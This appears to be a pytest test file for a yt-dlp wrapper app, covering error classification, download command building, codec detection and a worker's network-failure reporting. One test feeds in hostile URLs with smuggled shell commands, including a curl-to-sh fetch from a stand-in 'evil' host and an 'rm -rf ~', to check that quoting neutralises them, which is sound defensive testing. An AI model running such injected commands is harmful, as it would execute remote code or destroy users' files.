from __future__ import annotations

import shlex

import pytest

from app import doctor, errors
from app.workers import inspect_worker
from app.ytdlp import command

# Messages as yt-dlp actually phrases them.
REAL_MESSAGES = [
    (
        "ERROR: [vimeo] 76979871: The web client only works when logged-in. Use --cookies, "
        "--cookies-from-browser, --username and --password",
        "LOGIN_REQUIRED",
    ),
    (
        "ERROR: [youtube] abc: Sign in to confirm you're not a bot. Use --cookies-from-browser",
        "BOT_CHECK",
    ),
    (
        "ERROR: [youtube] abc: Sign in to confirm your age. This video may be inappropriate for "
        "some users.",
        "AGE_RESTRICTED",
    ),
    (
        "ERROR: [youtube] abc: Video unavailable. This video has been removed by the uploader",
        "VIDEO_UNAVAILABLE",
    ),
    (
        "ERROR: [youtube] abc: The uploader has not made this video available in your country",
        "GEO_RESTRICTED",
    ),
    ("ERROR: [generic] Unable to download webpage: HTTP Error 404: Not Found", "VIDEO_UNAVAILABLE"),
    ("ERROR: unable to download video data: HTTP Error 403: Forbidden", "FORBIDDEN"),
    ("ERROR: [youtube] abc: HTTP Error 429: Too Many Requests", "RATE_LIMITED"),
    ("ERROR: [SomeSite] abc: This video is DRM protected", "DRM_PROTECTED"),
    ("ERROR: Unsupported URL: https://example.com/x", "UNSUPPORTED_SITE"),
    (
        "ERROR: [generic] Unable to download webpage: <urlopen error [Errno 61] Connection "
        "refused>",
        "NETWORK",
    ),
    ("something we have never seen", "UNKNOWN"),
]


@pytest.mark.parametrize(("message", "expected"), REAL_MESSAGES)
def test_classify(message: str, expected: str) -> None:
    assert errors.classify(message) == expected


def test_warnings_that_mean_formats_went_missing_are_surfaced() -> None:
    found = errors.classify_warnings(
        [
            "[youtube] No supported JavaScript runtime could be found. Only deno is enabled",
            "[youtube] abc: Signature solving failed: Some formats may be missing.",
            "unrelated warning",
        ]
    )
    assert found == ["NO_JS_RUNTIME", "FORMATS_MAY_BE_MISSING"]


def test_multi_audio_command_needs_the_multistreams_flag() -> None:
    argv = command.build_command(
        "https://x/y", video_format_id="616", audio_format_ids=["251-0", "251-1"]
    )
    assert "--audio-multistreams" in argv
    assert argv[argv.index("-f") + 1] == "616+251-0+251-1"
    assert "mkv" in argv


def test_single_audio_command_omits_the_flag() -> None:
    argv = command.build_command("https://x/y", video_format_id="616", audio_format_ids=["251"])
    assert "--audio-multistreams" not in argv


@pytest.mark.parametrize(
    "url",
    [
        "https://www.youtube.com/watch?v=ID&x='$(curl${IFS}evil|sh)'",
        "https://x/y?a=b&c=d; rm -rf ~",
        "https://x/y?q=`id`",
    ],
)
def test_quoted_command_round_trips_hostile_urls(url: str) -> None:
    """What Berk pastes into a terminal must parse back to exactly one, unchanged argument."""
    quoted = command.quote(["yt-dlp", url])
    assert shlex.split(quoted) == ["yt-dlp", url]


def test_doctor_matches_the_name_column_only() -> None:
    listing = (
        " A....D aac_at               aac (AudioToolbox) (codec aac)\n"
        " A....D libopus              libopus Opus (codec opus)\n"
        " .. loudnorm          A->A       EBU R128 loudness normalization\n"
    )
    assert doctor.listing_has(listing, "aac_at")
    assert not doctor.listing_has(listing, "aac")
    assert doctor.listing_has(listing, "loudnorm")
    assert not doctor.listing_has(listing, "subtitles")


def test_inspect_worker_reports_the_real_failure_not_video_unavailable() -> None:
    """Port 1 on loopback refuses connections, so this fails fast and never leaves the machine."""
    result = inspect_worker.run({"url": "http://127.0.0.1:1/clip.mp4"})
    assert result["ok"] is False
    assert result["error"]["code"] == "NETWORK"
    assert "refused" in result["error"]["raw"].lower()
